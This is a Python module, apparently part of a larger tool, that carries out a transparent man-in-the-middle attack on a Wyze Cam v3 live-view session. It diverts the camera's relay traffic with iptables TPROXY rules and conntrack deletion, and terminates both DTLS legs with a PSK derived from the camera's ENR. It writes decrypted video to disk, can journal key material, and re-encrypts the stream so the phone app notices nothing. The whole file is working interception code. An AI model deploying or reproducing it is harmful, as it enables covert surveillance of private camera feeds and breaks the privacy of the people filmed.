"""Transparent DTLS splice of a Wyze Cam v3 live-view session.

When the phone app opens the live feed, the camera and the phone run a
DTLS 1.2 ECDHE-PSK handshake through ThroughTek (TUTK) relays, inside
0xCC51 wrappers. The PSK is derived from the camera's ENR alone
(dtls.derive_psk), so an on-path host can terminate both legs: server
toward the phone, client toward the camera. It decrypts the media and
re-encrypts it for the phone, so the app keeps playing.

How the session is caught (this host is the camera's router, onpath.py):

1. Watch: nothing is diverted. RelayFlowWatcher sniffs the camera's UDP
   and latches when a session's data flow is born -- normally on the
   camera's 0x1102 channel-open to a fresh relay tuple that answers,
   just before the phone's first ClientHello.
2. Divert: open the sockets first, then pin TPROXY rules to the camera's
   exact 5-tuple toward the data relay and each live STUN relay (:3478),
   so the phone's ClientHello reaches the engine whichever path it takes.
   The relay side is a plain socket on our own address and the camera's
   port (we NAT the camera, so that is the address the relays know); its
   NAT conntrack entry is deleted so the replies reach us.
3. Splice: dtls.SpliceEngine handles both legs and reuses the original
   wrappers byte for byte, so no UID or relay credentials are needed.
   Anything the engine does not own (keepalives, control) is forwarded
   verbatim. Emissions carry the TTL a forwarded packet would have.
4. Tear down when the camera goes quiet or the attempt stalls, give the
   flows back to the kernel, and re-watch for the app's next attempt.
"""
import hashlib
import select
import socket
import struct
import time
from pathlib import Path

from .netutil import conntrack_delete, iface_for, ip_cmd, ipt, ipt_restore
from .tutk import (CMD_CHANNEL_OPEN, STUN_RELAY_PORT, is_clienthello_flight,
                   is_dtls_wrap, is_hs_flight, is_plain_clienthello, wrap_cmd)
from .dtls import SpliceEngine

from . import rawnet
import threading

# never latch on DNS or NTP
EXCLUDE_PORTS = {53, 123}
# phone-side plain-CH must be this fresh (s) for an outbound handshake
# flight to latch: the CH precedes the camera's flight by ~1.1s, and a
# dead flow's marks must go stale long before the app's ~13s retry
INBOUND_TTL = 5
# a relay tuple we already latched is blocked this long (s): the app
# retries on a NEW port, so ghost keepalives and dead-flow retransmits
# on old tuples must not re-latch them. A plain CH (fresh session)
# may still latch on a tried tuple.
TRIED_TTL = 120
SPLICE_PORT = 51820
TP_MARK = "0x1"
TP_TABLE = "100"
IP_TRANSPARENT = 19  # SOL_IP option; the socket module may not define it
IP_RECVTTL = getattr(socket, "IP_RECVTTL", 12)
IP_TTL = getattr(socket, "IP_TTL", 2)
# identical-packet ceiling per source per second; a healthy flow never
# repeats the same bytes this fast, but an un-ACKed keepalive spin does
STORM_LIMIT = 100
# camera silent this long (s) after both legs are up => it closed the
# channel; the teardown must land well inside the app's ~13 s retry
CAM_SILENT = 3


class StormGuard:
    """Drops byte-identical packets beyond STORM_LIMIT per source per
    fixed 1-second bucket. A healthy flow never repeats the same bytes
    this fast; an un-ACKed wrapper keepalive spins at 100K+ pps."""

    def __init__(self, limit=STORM_LIMIT):
        self.limit = limit
        self.seen = {}
        self.dropped = 0

    def allow(self, src, payload, now=None):
        now = time.time() if now is None else now
        k = (src[0], src[1], hashlib.md5(payload).hexdigest())
        e = self.seen.get(k)
        if e is None or now - e[0] >= 1.0:
            if len(self.seen) > 4096:
                self.seen = {}
            self.seen[k] = [now, 1]
            return True
        e[1] += 1
        if e[1] > self.limit:
            self.dropped += 1
            return False
        return True


def install_splice_rules(us, cam_ip, cam_port, peers):
    """Divert the camera's packets toward each peer (relay ip, port) to
    the splice, in ONE iptables-restore spawn (install speed matters
    inside the handshake window), and open an INPUT hole for the peers'
    replies to our relay-side sockets. Only exact 5-tuples are diverted:
    the camera's side flows to the same relay on other ports (IOTC
    control) stay with the kernel.

    Call this with the sockets already open: a divert with no reader
    black-holes the flow. Returns (kind, undo-args) cleanup commands, or
    None on failure."""
    tp = f"-j TPROXY --on-port {SPLICE_PORT} --tproxy-mark {TP_MARK}/0x1"
    mangle, filt = [], []
    for pip, pport in peers:
        mangle.append(f"-I PREROUTING 1 -s {cam_ip} -p udp --sport {cam_port} "
                      f"-d {pip} --dport {pport} {tp}")
        # firewalls (nixos-fw) drop unsolicited UDP to local sockets
        filt.append(f"-I INPUT 1 -s {pip} -p udp --sport {pport} "
                    f"-d {us} --dport {cam_port} -j ACCEPT")
    blob = ("*mangle\n" + "\n".join(mangle) + "\nCOMMIT\n"
            "*filter\n" + "\n".join(filt) + "\nCOMMIT\n")
    res = ipt_restore(blob)
    if res.returncode != 0:
        print("[!] iptables-restore failed:", res.stderr.strip())
        return None
    # policy route: marked packets are local
    ip_cmd("rule", "add", "fwmark", TP_MARK, "pref", TP_TABLE, "table", TP_TABLE)
    ip_cmd("route", "add", "local", "0.0.0.0/0", "dev", "lo", "table", TP_TABLE)
    tpa = ("-j", "TPROXY", "--on-port", str(SPLICE_PORT),
           "--tproxy-mark", f"{TP_MARK}/0x1")
    cleanup = []
    for pip, pport in peers:
        cleanup.append(
            ("ipt", ("-t", "mangle", "-D", "PREROUTING", "-s", cam_ip, "-p",
                     "udp", "--sport", str(cam_port), "-d", pip, "--dport",
                     str(pport), *tpa)))
        cleanup.append(
            ("ipt", ("-t", "filter", "-D", "INPUT", "-s", pip, "-p", "udp",
                     "--sport", str(pport), "-d", us, "--dport",
                     str(cam_port), "-j", "ACCEPT")))
    cleanup += [
        ("ip", ("rule", "del", "fwmark", TP_MARK, "pref", TP_TABLE,
                "table", TP_TABLE)),
        ("ip", ("route", "del", "local", "0.0.0.0/0", "dev", "lo",
                "table", TP_TABLE)),
    ]
    print(f"[+] divert armed: {cam_ip}:{cam_port} -> "
          + ", ".join(f"{p[0]}:{p[1]}" for p in peers))
    return cleanup


def recv_ttl(face):
    """recvmsg on a face: (data, ttl or None)."""
    data, anc, _flags, _addr = face.recvmsg(65535, 64)
    for lvl, typ, cdata in anc:
        if lvl == socket.IPPROTO_IP and typ == IP_TTL and len(cdata) >= 4:
            return data, struct.unpack("=i", cdata[:4])[0]
    return data, None


class TtlMirror:
    """Gives each emission the TTL the kernel would have given the packet
    it replaces had it been forwarded: (TTL on arrival here) - 1.

    A packet re-originated from a socket otherwise leaves with TTL 64, so
    after the divert the camera suddenly saw its relay ~14 hops closer,
    and it stopped sending through us about 1 s later -- even with the
    payload untouched."""

    def __init__(self, face):
        self.face = face
        self.ttl = None

    def follow(self, arrived_ttl):
        if arrived_ttl is None or arrived_ttl <= 1:
            return
        want = arrived_ttl - 1
        if want != self.ttl:
            try:
                self.face.setsockopt(socket.IPPROTO_IP, IP_TTL, want)
                self.ttl = want
            except OSError:
                pass


def open_faces(cam_addr, relay_addr, us):
    """The two sockets that carry one diverted path:

      cam_face   transparent, bound to relay_addr and connected to the
                 camera: TPROXY steers the camera's packets for the relay
                 here; sends reach the camera FROM the relay's address
      relay_face plain, bound to (us, camera port) and connected to the
                 relay: the address the relay knows the camera by, since
                 we NAT the camera with its port preserved

    Returns (cam_face, relay_face) or raises OSError."""
    faces = []
    try:
        for bind_to, peer, transparent in ((relay_addr, cam_addr, True),
                                           ((us, cam_addr[1]), relay_addr,
                                            False)):
            f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            faces.append(f)
            if transparent:
                f.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)
            f.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            f.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
            f.setsockopt(socket.IPPROTO_IP, IP_RECVTTL, 1)
            f.bind(bind_to)
            f.connect(peer)
            f.setblocking(False)
    except OSError:
        for f in faces:
            f.close()
        raise
    return faces[0], faces[1]


class RelayFlowWatcher:
    """Sniffs the camera's UDP and decides when a viewing session's DTLS
    data flow is starting (the latch). Installs no rules itself."""

    def __init__(self, target, masq_ip):
        self.target = target
        # replies to the camera arrive addressed to our own IP (we NAT
        # it), on the camera's port-preserved source port
        self.masq_ip = masq_ip
        self.cam_ports = set()
        self.seen = {}          # (dst, dport) -> [first_seen, count]
        self.relay_ip = None
        self.relay_port = None
        self.cam_port = None
        self.found = threading.Event()
        self.inbound_1502 = {}    # (ip, port) -> last phone-side plain-CH time
        self.inbound_1102 = {}    # (ip, port) -> last relay-side channel-open time
        self.tried = {}           # (ip, port) -> latch time (TRIED_TTL)
        self.last_seen = {}       # (ip, port) -> last camera packet time
        self.extra_paths = []     # STUN-relay :3478 tuples to divert too

    def _latch(self, ip, port, cam_port, how):
        """Arm on (ip, port). Every latch records the tuple as tried so
        post-teardown relatches skip it: the app retries on a NEW relay
        port, and dead flows retransmit for tens of seconds."""
        self.relay_ip, self.relay_port = ip, port
        self.cam_port = cam_port
        now = time.time()
        self.extra_paths = sorted(
            k for k, t in self.last_seen.items()
            if k[1] == STUN_RELAY_PORT and now - t < 60 and k != (ip, port))
        self.tried[(ip, port)] = now
        stale = [k for k, t in self.tried.items() if now - t > TRIED_TTL]
        for k in stale:
            del self.tried[k]
        print(f"[+] relay flow ({how}): {self.target}:{cam_port} <-> {ip}:{port}")
        self.found.set()

    def _cb(self, pkt):
        """pkt: rawnet.UdpPacket"""
        payload = pkt.payload
        src, dst = pkt.src, pkt.dst
        # inbound (phone via relay -> camera). Only a PLAIN ClientHello
        # marks the tuple (run-6: ghost flows from abandoned sessions
        # retransmit cookie-CHs and CKEs for 15s+; a mark from those let
        # camera-side retransmits re-latch the dead tuple across the
        # app's retry window). The mark's TTL (INBOUND_TTL) is sized to
        # the ~1.1s CH-to-camera-flight gap, not to session lifetime.
        if src == self.target:
            self.cam_ports.add(pkt.sport)
        if dst == self.target or (dst == self.masq_ip
                                  and pkt.dport in self.cam_ports):
            if (is_plain_clienthello(payload)
                    and pkt.sport not in EXCLUDE_PORTS
                    and pkt.dport not in EXCLUDE_PORTS):
                now = time.time()
                self.inbound_1502[(src, pkt.sport)] = now
                stale = [k for k, t in self.inbound_1502.items()
                         if now - t > 300]
                for k in stale:
                    del self.inbound_1502[k]
            # relay-side channel-open responses mark the tuple for the
            # pre-CH latch below
            if (len(payload) > 24 and payload[:2] == b"\x51\xcc"
                    and wrap_cmd(payload) == CMD_CHANNEL_OPEN
                    and pkt.sport not in EXCLUDE_PORTS
                    and pkt.dport not in EXCLUDE_PORTS):
                self.inbound_1102[(src, pkt.sport)] = time.time()
            # fast path: the phone's plain CH latches immediately when
            # the camera already opened the flow. This entry is
            # IMPERFECT -- the camera may have seen the phone's first
            # CH (it passed pre-arm) and bound its server flight to
            # it, which the client leg cannot splice -- but the app's
            # automatic retry then gets the clean pre-CH entry. May
            # fire on a tried tuple: a plain CH always means a fresh
            # session attempt.
            if (self.relay_port is None
                    and is_plain_clienthello(payload)
                    and (src, pkt.sport) in self.seen
                    and pkt.dport not in EXCLUDE_PORTS):
                self._latch(src, pkt.sport, pkt.dport, "phone CH")
            return
        if src != self.target:
            return
        if pkt.dport in EXCLUDE_PORTS or pkt.sport in EXCLUDE_PORTS:
            return
        o1 = int(dst.split(".")[0])
        if o1 in (10, 127) or o1 >= 224:
            return
        key = (dst, pkt.dport)
        c = self.seen.get(key)
        if c is None:
            c = self.seen[key] = [time.time(), 0]
            print(f"[*] new public flow: {key[0]}:{key[1]} (cam port {pkt.sport})")
        c[1] += 1
        self.last_seen[key] = time.time()
        cmd = (wrap_cmd(payload)
               if len(payload) > 8 and payload[:2] == b"\x51\xcc" else 0)
        # PRE-CH LATCH (primary): the camera's 0x1102 channel-open to a
        # FRESH relay tuple that answers back is the data flow being
        # born -- run-6: exchange completes ~130ms in, the phone's
        # first CH follows ~440ms later. Arming here means the phone's
        # FIRST CH is diverted, so the camera never sees a ClientHello
        # that isn't the engine's -- the splice3-proven clean entry,
        # reached deterministically. Fresh (<10s since the camera's
        # first packet to this tuple) excludes old probe tuples and
        # long-lived flows; untried excludes tuples a previous latch
        # burned (ghost keepalives); the response requirement excludes
        # the camera's one-way 0x1102 sprays at unreachable candidates.
        if (self.relay_port is None and cmd == CMD_CHANNEL_OPEN
                and key not in self.tried
                and time.time() - c[0] < 10
                and time.time() - self.inbound_1102.get(key, 0) < 2):
            self._latch(key[0], key[1], pkt.sport, "channel-open")
            return
        # CONFIRMED FALLBACK: the camera's first outbound handshake
        # flight (rt=22/ep=0) with a fresh plain-CH mark on the same
        # reversed tuple. This entry is imperfect (see the fast path:
        # the camera may have bound to the real phone's CH) -- it
        # exists for when both earlier latches missed (e.g. the
        # watcher restarted mid-flow). Media (rt=23) never latches:
        # diverting an established session into a not-yet-started
        # engine drops its media and kills the user's video.
        if (self.relay_port is None and is_hs_flight(payload)
                and time.time() - self.inbound_1502.get(key, 0)
                < INBOUND_TTL):
            self._latch(key[0], key[1], pkt.sport, "1502-confirmed")
            return
        # RATE FALLBACK: handshake-burst confirmation for flows whose
        # camera flight somehow fails is_hs_flight. Control and
        # P2P-handshake wrappers (0x1102/0x1202 channel-opens, the
        # ECDSA-signed 0x0202/0x0402 exchange) also retransmit in
        # tight bursts and must not latch (2026-10-25: 15 x 0x0202 in
        # 200us).
        if (self.relay_port is None
                and time.time() - c[0] < 2 and c[1] >= 10
                and is_hs_flight(payload)
                and time.time() - self.inbound_1502.get(key, 0)
                < INBOUND_TTL):
            self._latch(key[0], key[1], pkt.sport, "rate-confirmed")

    def wait(self, timeout=300):
        # A suspend/resume can tear the sniffer down mid-session (the
        # interface disappears); retry instead of dying so a long-running
        # watcher survives the host sleeping.
        deadline = time.time() + timeout
        prog = rawnet.udp_filter([self.target], [self.masq_ip])
        while not self.found.is_set() and time.time() < deadline:
            try:
                rawnet.sniff(iface_for(self.target), prog, rawnet.parse_udp,
                             self._cb, self.found.is_set,
                             timeout=max(1, deadline - time.time()))
            except OSError as e:
                print(f"[!] sniffer error ({e}); retrying in 5s")
                time.sleep(5)
        return self.found.is_set()

    def rearm(self):
        """Back to watching after a session is torn down."""
        self.found.clear()
        self.relay_ip = self.relay_port = self.cam_port = None


def _relatch_reason(engine, latch_time, last_packet, now, last_cam=None):
    """Why the armed session should be abandoned, or None to keep it.

    Live timing: an attempt can stall at the camera (HVR answered,
    server flight never sent); the phone gives up at ~2 s and retries
    on a NEW relay port ~13 s after its first CH. Every teardown must
    fire well inside that window or the retry passes un-spliced under
    rules pinned to the dead tuple. A healthy handshake completes both
    legs within ~2 s of the latch; live media has packets every <=1 s.
    """
    if not engine:
        # pass-through mode (A/B control: same divert and faces, no DTLS
        # termination) must still re-arm, but it has no handshake state, so
        # liveness is the camera's DTLS traffic alone
        if last_cam is not None and now - last_cam > CAM_SILENT:
            return f"pass-through: camera silent {CAM_SILENT}s"
        if now - last_packet > 30:
            return "pass-through: session quiet 30s"
        return None
    if not engine.started:
        if now - latch_time > 5:
            return "stale latch (no phone CH within 5s)"
        return None
    if engine.failed:
        # from latch_time, not last_packet: a failed engine's tuple may
        # stay busy with retransmits that would otherwise postpone the
        # teardown right across the app's retry window
        if now - latch_time > 8:
            return "engine failed"
        return None
    if not engine.client_leg.handshake_done:
        if now - latch_time > 5:
            return "camera leg stalled (no server flight)"
        return None
    if last_cam is not None and now - last_cam > CAM_SILENT:
        return f"camera silent {CAM_SILENT}s (channel closed)"
    if now - last_packet > 30:
        return "session quiet 30s"
    return None


class Splicer:
    """Watch -> divert -> splice -> tear down, repeated per app attempt.

    Expects this host to already be on the camera's path (OnPath). Writes
    to `out`: av.bin (decrypted media, see media.py), splice.log (engine
    milestones), interpose.log (every wrapper seen and sent) and, with
    journal=True, journal.jsonl (all key material, for offline analysis).
    """

    def __init__(self, target, enr, us, out, pass_through=False,
                 journal=False):
        self.target, self.enr, self.us = target, enr, us
        self.out = Path(out)
        self.pass_through, self.journal = pass_through, journal
        self.watcher = RelayFlowWatcher(target, masq_ip=us)
        self.storm_guard = StormGuard()
        self.stats = {}
        self._send_errs = set()
        self.spliced_sessions = 0

    # -- plumbing --------------------------------------------------------
    def _record(self, tag, data):
        # tag(1) + u64be ms + u32be len + wrapper. C = from camera,
        # R = from relay, e = sent to camera, E = sent to relay
        self.log.write(tag + struct.pack(">QI", int(time.time() * 1000),
                                         len(data)) + data)

    def _tx(self, face, data, key):
        """Send on a face; errors (ICMP-refused peer) are counted and
        reported once per errno, never fatal."""
        try:
            face.send(data)
            self.stats[key] += 1
            self._record(b"e" if key == "to_cam" else b"E", data)
        except OSError as e:
            self.stats["send_err"] += 1
            if e.errno not in self._send_errs:
                self._send_errs.add(e.errno)
                print(f"[!] send {key} failed: {e!r}")

    def _new_engine(self):
        if self.pass_through:
            return None
        return SpliceEngine(self.enr, av_log=str(self.out / "av.bin"),
                            event_log=str(self.out / "splice.log"),
                            journal=str(self.out / "journal.jsonl")
                            if self.journal else None)

    def _setup(self):
        self.out.mkdir(parents=True, exist_ok=True)
        self.log = open(self.out / "interpose.log", "ab", buffering=0)
        # catch-all transparent socket: TPROXY needs a listener on
        # SPLICE_PORT; the connected faces get the diverted flows, so only
        # strays land here
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        for _ in range(30):
            try:
                sock.bind(("0.0.0.0", SPLICE_PORT))
                break
            except OSError:
                # a predecessor may still hold the port for a moment
                time.sleep(1)
        else:
            raise SystemExit(f"could not bind :{SPLICE_PORT}")
        sock.setblocking(False)
        self.sock = sock
        # TPROXY'd packets are routed by a 'local 0.0.0.0/0' policy route
        # while their destination is not a local address; with rp_filter
        # on, the input route lookup rejects them as martians unless
        # accept_local is set, and they vanish between PREROUTING and
        # INPUT. conf/all: the flow may arrive on any interface.
        self._accept_local = Path("/proc/sys/net/ipv4/conf/all/accept_local")
        self._old_accept_local = self._accept_local.read_text().strip()
        self._accept_local.write_text("1\n")

    def _teardown(self):
        self._accept_local.write_text(self._old_accept_local + "\n")
        self.sock.close()
        self.log.close()

    # -- main loop -------------------------------------------------------
    def run(self, sessions=None):
        """Splice app attempts until Ctrl-C, or until `sessions` sessions
        have been spliced end to end (both DTLS legs up)."""
        self._setup()
        print(f"[*] watching {self.target} for a live-view session "
              f"(open the feed in the app)")
        try:
            while sessions is None or self.spliced_sessions < sessions:
                if not self.watcher.wait(timeout=60):
                    continue
                reason = self._session()
                if reason == "interrupted":
                    break
                print(f"[*] session over: {reason}")
                self.watcher.rearm()
        except KeyboardInterrupt:
            pass
        finally:
            self._teardown()
        return self.spliced_sessions

    def _session(self):
        """Divert and splice one latched attempt; returns why it ended."""
        w = self.watcher
        cam_port = w.cam_port
        cam_addr = (self.target, cam_port)
        relay_addr = (w.relay_ip, w.relay_port)
        # every relay path the session may use: the data relay it latched
        # on plus the camera's live STUN-relay :3478 flows
        peers = [relay_addr] + [p for p in w.extra_paths if p != relay_addr]
        # sockets first, rules second: the first diverted packet must find
        # its reader
        paths = []
        try:
            for peer in peers:
                cf, rf = open_faces(cam_addr, peer, self.us)
                paths.append({"peer": peer, "cam_face": cf, "relay_face": rf})
        except OSError as e:
            for pth in paths:
                pth["cam_face"].close()
                pth["relay_face"].close()
            return f"could not open sockets ({e!r})"
        cleanup = install_splice_rules(self.us, self.target, cam_port, peers)
        if cleanup is None:
            for pth in paths:
                pth["cam_face"].close()
                pth["relay_face"].close()
            return "rule install failed"
        # hand each flow's NAT address from the kernel to our relay-side
        # socket: until its conntrack entry is gone, the relay's replies
        # are de-NATed to the camera instead of reaching relay_face
        for pip, pport in peers:
            conntrack_delete(self.target, cam_port, pip, pport)
        try:
            return self._splice(paths)
        finally:
            for kind, cargs in reversed(cleanup):
                (ipt if kind == "ipt" else ip_cmd)(*cargs)
            for pth in paths:
                pth["cam_face"].close()
                pth["relay_face"].close()
            # give the flows back to the kernel: the camera's next packet
            # gets a fresh NAT entry on the same port, so the relays keep
            # seeing the same public address
            for pip, pport in peers:
                for src in (self.us, self.target):
                    conntrack_delete(src, cam_port, pip, pport)
                conntrack_delete(pip, pport, self.us, cam_port)
            self.stats["storm_dropped"] = self.storm_guard.dropped
            print(f"[+] divert removed. stats: {self.stats}")

    def _splice(self, paths):
        engine = self._new_engine()
        stats = self.stats
        stats.clear()
        stats.update({"from_cam": 0, "from_relay": 0, "to_cam": 0,
                      "to_relay": 0, "storm_dropped": 0, "stray": 0,
                      "send_err": 0})
        self.storm_guard.dropped = 0
        milestone = [""]
        latch_time = last_packet = last_cam = time.time()
        tx, record, storm_guard = self._tx, self._record, self.storm_guard

        def status():
            if not engine:
                return
            if engine.failed:
                m = f"engine failed ({engine.failed}); forwarding verbatim"
            elif engine.client_leg.handshake_done:
                m = "spliced: both DTLS legs up, decrypting media"
            elif engine.server_leg.handshake_done:
                m = "phone leg up; finishing the camera leg"
            elif engine.started:
                m = "phone ClientHello caught; handshaking both legs"
            else:
                m = ""
            if m and m != milestone[0]:
                milestone[0] = m
                print(f"[splice] {m}")

        # packets to the camera mirror the relay side's arrival TTL;
        # packets to the relay mirror the camera's (64 -> 63)
        face_of = {}
        for pth in paths:
            pth["to_cam_ttl"] = TtlMirror(pth["cam_face"])
            pth["to_relay_ttl"] = TtlMirror(pth["relay_face"])
            pth["to_relay_ttl"].follow(64)
            face_of[pth["cam_face"]] = (pth, "cam")
            face_of[pth["relay_face"]] = (pth, "relay")
        data_path = paths[0]
        # which path last carried each wrapper type, per side: an engine
        # emission goes out on the path its (reused) wrapper belongs to,
        # so 0x1402 flights travel via the STUN relay the peer used and
        # 0x1502 via the data relay
        phone_path_for, cam_path_for = {}, {}

        def deliver(to_cam, to_phone):
            for w_ in to_cam:
                pth = phone_path_for.get(wrap_cmd(w_), data_path)
                tx(pth["cam_face"], w_, "to_cam")
            for w_ in to_phone:
                c_ = wrap_cmd(w_)
                pth = cam_path_for.get(c_) or phone_path_for.get(c_, data_path)
                tx(pth["relay_face"], w_, "to_relay")

        next_stats = time.time() + 10
        spliced = False
        try:
            while True:
                ready, _, _ = select.select(list(face_of) + [self.sock],
                                            [], [], 0.25)
                now = time.time()
                if engine and not engine.failed:
                    deliver(*engine.tick(now))
                if now > next_stats:
                    next_stats = now + 10
                    stats["storm_dropped"] = storm_guard.dropped
                    print(f"[*] stats: {stats}")
                for face in ready:
                    while True:   # drain everything queued on this face
                        try:
                            if face is self.sock:
                                data, ttl = face.recv(65535), None
                            else:
                                data, ttl = recv_ttl(face)
                        except (BlockingIOError, socket.timeout):
                            break
                        except OSError:
                            # ICMP error queued on a connected UDP socket
                            continue
                        if face is self.sock:
                            # matched no face; count it, never forward blind
                            stats["stray"] += 1
                            record(b"S", data)
                            continue
                        pth, side = face_of[face]
                        dtls = is_dtls_wrap(data)
                        # liveness is DTLS traffic only: the camera's 0x1202
                        # keepalives outlive the session
                        if dtls:
                            last_packet = time.time()
                        if side == "cam":
                            pth["to_relay_ttl"].follow(ttl)
                            stats["from_cam"] += 1
                            record(b"C", data)
                            if dtls:
                                last_cam = time.time()
                                cam_path_for[wrap_cmd(data)] = pth
                            if (engine and not engine.failed
                                    and engine.started and dtls
                                    and data[14:24] == engine.session_key):
                                deliver(*engine.on_cam_packet(data))
                                if engine.failed:
                                    # never swallow the packet that broke it
                                    tx(pth["relay_face"], data, "to_relay")
                            elif storm_guard.allow(pth["peer"], data):
                                tx(pth["relay_face"], data, "to_relay")
                        else:
                            pth["to_cam_ttl"].follow(ttl)
                            stats["from_relay"] += 1
                            record(b"R", data)
                            if dtls:
                                phone_path_for[wrap_cmd(data)] = pth
                            # a failed engine would leave the app's retry
                            # un-spliced; a fresh PLAIN CH (never a ghost
                            # cookie-CH retransmit) rebuilds it
                            if (engine and engine.failed
                                    and is_plain_clienthello(data)):
                                print("[*] fresh phone ClientHello after "
                                      "engine failure; rebuilding engine")
                                engine = self._new_engine()
                                latch_time = time.time()
                            if (engine and not engine.failed and dtls
                                    and (data[14:24] == engine.session_key
                                         if engine.started
                                         else is_clienthello_flight(data))):
                                deliver(*engine.on_phone_packet(data))
                                if engine.failed:
                                    tx(pth["cam_face"], data, "to_cam")
                            elif storm_guard.allow(pth["peer"], data):
                                tx(pth["cam_face"], data, "to_cam")
                        status()
                if engine and engine.client_leg.handshake_done:
                    spliced = True
                reason = _relatch_reason(
                    engine, latch_time, last_packet, time.time(),
                    last_cam if (engine is None
                                 or engine.client_leg.handshake_done)
                    else None)
                if reason:
                    return reason
        except KeyboardInterrupt:
            return "interrupted"
        finally:
            if spliced:
                self.spliced_sessions += 1
